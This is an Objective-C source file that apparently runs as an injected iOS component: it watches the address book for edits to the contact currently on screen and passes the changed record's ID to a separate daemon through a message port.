//
//  ContactInfo.m
//  MSFSP
//
//  Created by Makara Khloth on 6/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ContactInfo.h"
#import "ABVCardRecord.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "AddressBook-Private.h"

static ContactInfo *_contactInfo = nil;

#pragma mark -
#pragma mark Function prototype of callback
#pragma mark -

void addressbookCallback(ABAddressBookRef aAddressbook, CFDictionaryRef aInfo, void *aContext);
void daemonAddressBookCallback (CFNotificationCenterRef center, 
								void *observer, 
								CFStringRef name, 
								const void *object, 
								CFDictionaryRef userInfo);

@interface ContactInfo (private)
- (void) daemonApplicationUpdatingAddressBook;
- (void) daemonApplicationUpdatingAddressBookFinished;

+ (BOOL) isStringEqual: (NSString *) aString1 withString: (NSString *) aString2;
+ (BOOL) isDataEqual: (NSData *) aData1 withData: (NSData *) aData2;

@end

@implementation ContactInfo

@synthesize mDisplayedPersonVcardData;
@synthesize mPicture;
@synthesize mNote;
@synthesize mDisplayedPersonRecordID;
@synthesize mAddressBook;
@synthesize mIsDaemonUpdating;

+ (id) sharedContactInfo {
	if (_contactInfo == nil) {
		_contactInfo = [[ContactInfo alloc] init];
	}
	return (_contactInfo);
}

+ (BOOL) contactDidChanges: (ABRecordID) aRecordID {
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kContactUpdateMsgPort];
	BOOL successfully = [messagePortSender writeDataToPort:[NSData dataWithBytes:&aRecordID length:sizeof(ABRecordID)]];
	[messagePortSender release];
	return (successfully);
}

- (id) init {
	if ((self = [super init])) {
		mAddressBook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	}
	return (self);
}

- (BOOL) isDisplayPersonChanges: (NSData *) aDisplayedPersonVcardData {
//	NSString *vcard1 = [[[NSString alloc] initWithData:[self mDisplayedPersonVcardData]
//											  encoding:NSUTF8StringEncoding] autorelease];
//	NSString *vcard2 = [[[NSString alloc] initWithData:aDisplayedPersonVcardData
//											  encoding:NSUTF8StringEncoding] autorelease];
//	DLog (@"Displayed person vcard string in view previously = %@", vcard1)
//	DLog (@"Displayed proson vcard string in view now = %@", vcard2)
	
	return (![ContactInfo isDataEqual:[self mDisplayedPersonVcardData]
							 withData:aDisplayedPersonVcardData]);
}

- (void) startMonitor {
	if (!mIsMonitoring && mAddressBook) {
		// 1. Use Darwin notification to change the status between daemon and this mobile substrate
		CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),	// center
										self,											// observer. this parameter may be NULL.
										&daemonAddressBookCallback,										// callback
										(CFStringRef)kDaemonApplicationUpdatingAddressBookNotification,				// name
										nil,											// object. this value is ignored in the case that the center is Darwin
										CFNotificationSuspensionBehaviorHold);
		
		CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),	// center
										self,											// observer. this parameter may be NULL.
										&daemonAddressBookCallback,										// callback
										(CFStringRef)kDaemonApplicationUpdatingAddressBookFinishedNotification,				// name
										nil,											// object. this value is ignored in the case that the center is Darwin
										CFNotificationSuspensionBehaviorHold);
		
		// 2. Monitor address book
		//DLog (@"Start monitoring address book change, address book = %@", [self mAddressBook])
		ABAddressBookRegisterExternalChangeCallback(mAddressBook, addressbookCallback, self);
		mIsMonitoring = YES;
	}
}

- (void) stopMonitor {
	if (mIsMonitoring && mAddressBook) {
		// 1. Darwin
		CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
											self,
											(CFStringRef)kDaemonApplicationUpdatingAddressBookNotification,
											nil);
		
		CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
											self,
											(CFStringRef)kDaemonApplicationUpdatingAddressBookFinishedNotification,
											nil);
		
		// 2. Address book monitor
		//DLog (@"Stop monitoring address book change, address book = %@", [self mAddressBook])
		ABAddressBookUnregisterExternalChangeCallback(mAddressBook, addressbookCallback, self);
		mIsMonitoring = NO;
	}
	mIsDaemonUpdating = NO;
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) daemonApplicationUpdatingAddressBook {
	mIsDaemonUpdating = YES;
}

- (void) daemonApplicationUpdatingAddressBookFinished {
	mIsDaemonUpdating = NO;
}

// Note: nil is not equal to nil if we compare using isEqualXX method

+ (BOOL) isStringEqual: (NSString *) aString1 withString: (NSString *) aString2 {
	BOOL equal = NO;
	if (aString1 == nil && aString2 == nil) {
		equal = YES;
	} else {
		equal = [aString1 isEqualToString:aString2];
	}
	return (equal);
}

+ (BOOL) isDataEqual: (NSData *) aData1 withData: (NSData *) aData2 {
	BOOL equal = NO;
	if (aData1 == nil && aData2 == nil) {
		equal = YES;
	} else {
		equal = [aData1 isEqualToData:aData2];
	}
	return (equal);
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) dealloc {
	[self stopMonitor];
	[mDisplayedPersonVcardData release];
	[mPicture release];
	[mNote release];
	CFRelease(mAddressBook);
	[super dealloc];
	_contactInfo = nil;
}

@end

#pragma mark -
#pragma mark Function definition of callback
#pragma mark -

void daemonAddressBookCallback (CFNotificationCenterRef center, 
								void *observer, 
								CFStringRef name, 
								const void *object, 
								CFDictionaryRef userInfo) {
    //DLog(@"Corresponding process post notification related to address book: %@", name);
	ContactInfo *contactInfo = (ContactInfo *) observer;
	NSString *notificationName = (NSString *)name;
	if ([notificationName isEqualToString:kDaemonApplicationUpdatingAddressBookFinishedNotification]) {
		[contactInfo daemonApplicationUpdatingAddressBookFinished];
	} else if ([notificationName isEqualToString:kDaemonApplicationUpdatingAddressBookNotification]) {
		[contactInfo daemonApplicationUpdatingAddressBook];
	}
}

/*
 NOTE: there are updates while phone in ABPersonViewController, thus notificaiton via Darwin alone is not
	enough; this behavor could vary from phone to phone
 */

void addressbookCallback(ABAddressBookRef aAddressbook, CFDictionaryRef aInfo, void *aContext) {
	DLog(@"MS-addressbookCallback !!! aInfo = %@, NSDictionary info = %@", aInfo, (NSDictionary *)aInfo); // Always nil
	
	ContactInfo* contactInfo = (ContactInfo*)aContext;
	//DLog (@"Call back address object = %@ vs instance variable object = %@", aAddressbook, [contactInfo mAddressBook]); // The same address book object
	
	// Allocate new address book object to get latest contact data otherwise won't get changes in compare
	ABAddressBookRef addressBook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	ABRecordRef abRecord = ABAddressBookGetPersonWithRecordID(addressBook, [contactInfo mDisplayedPersonRecordID]);
	//DLog (@"Updated address book record = %@, ID = %d", abRecord, [contactInfo mDisplayedPersonRecordID]);
	
	if (abRecord) {
		ABVCardRecord* abVcardRecord = [[ABVCardRecord alloc] initWithRecord:(void *)abRecord];
		NSData *displayedPersonVcardData = [abVcardRecord _21vCardRepresentationAsData];
		
		// Photo and note
		NSData *photo = [abVcardRecord imageData];
		NSString *note = (NSString *)ABRecordCopyValue(abRecord, kABPersonNoteProperty);
		
		/*
		DLog(@"----------------------------------------------------------")
		DLog(@"displayedPersonVcardData = %@", displayedPersonVcardData)
		DLog(@"self.displayedPersonVcardData = %@", [contactInfo mDisplayedPersonVcardData])
		DLog(@"----------------------------------------------------------")
		
		DLog(@"----------------------------------------------------------")
		DLog(@"photo = %@", photo)
		DLog(@"self.photo = %@", [contactInfo mPicture])
		DLog(@"----------------------------------------------------------")
		
		DLog(@"----------------------------------------------------------")
		DLog(@"note = %@", note)
		DLog(@"self.note = %@", [contactInfo mNote])
		DLog(@"----------------------------------------------------------")
		*/
		
		if (![contactInfo mIsDaemonUpdating]) {
			if ([contactInfo isDisplayPersonChanges:displayedPersonVcardData] ||
				![ContactInfo isDataEqual:photo withData:[contactInfo mPicture]] ||
				![ContactInfo isStringEqual:note withString:[contactInfo mNote]]) {
				
				DLog (@"Displayed person have changed, recordID = %d", [contactInfo mDisplayedPersonRecordID])
				
				[contactInfo setMDisplayedPersonVcardData:displayedPersonVcardData];
				[contactInfo setMPicture:photo];
				[contactInfo setMNote:note];
				
				[ContactInfo contactDidChanges:[contactInfo mDisplayedPersonRecordID]];
			} else {
				DLog (@"Contact in address book is not change");
			}
		} else {
			DLog (@"Something is changed but it's assume from corresponding process");
			
			[contactInfo setMDisplayedPersonVcardData:displayedPersonVcardData];
			[contactInfo setMPicture:photo];
			[contactInfo setMNote:note];
		}
		
		[note release];
		[abVcardRecord release];
	} else { // Addres book record is deleted
		// Thus send to update right the way
		DLog (@"Contact is deleted thus send its deleted id right the way")
		[ContactInfo contactDidChanges:[contactInfo mDisplayedPersonRecordID]];
	}
	CFRelease(addressBook);
}
